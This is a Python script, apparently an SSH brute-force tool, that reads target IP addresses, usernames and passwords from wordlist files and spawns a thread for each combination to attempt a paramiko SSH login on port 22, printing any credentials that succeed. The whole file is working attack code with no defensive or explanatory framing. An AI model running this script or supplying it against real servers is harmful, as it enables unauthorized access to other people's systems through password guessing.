import paramiko
import threading


def get_ip_list():
    IP_LIST = []
    f = open('../res/iplist.txt')
    for item in f.readlines():
        item = item.strip()
        if item and not item.startswith('#'):
            IP_LIST.append(item)
    f.close()
    return IP_LIST


def get_user_list():
    USER_LIST = []
    f = open('../res/SSHUser.txt')
    for item in f.readlines():
        item = item.strip()
        if item and not item.startswith('#'):
            USER_LIST.append(item)
    f.close()
    return USER_LIST


def get_password_list():
    PASSWORD_LIST = []
    f = open('../res/SSHDict.txt')
    for item in f.readlines():
        item = item.strip()
        if item and not item.startswith('#'):
            PASSWORD_LIST.append(item)
    f.close()
    return PASSWORD_LIST


def scan_all():
    ip_list = get_ip_list()
    for ip in ip_list:
        user_list = get_user_list()
        password_list = get_password_list()
        for user in user_list:
            for password in password_list:
                th = threading.Thread(target=cracking, args=(ip, user, password))
                th.start()


def cracking(ip, user, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, 22, user, password, timeout=5)
        print ("%s user is: %s, password is: %s" % (ip, user, password))
    except Exception as e:
        pass


if __name__ == '__main__':
    scan_all()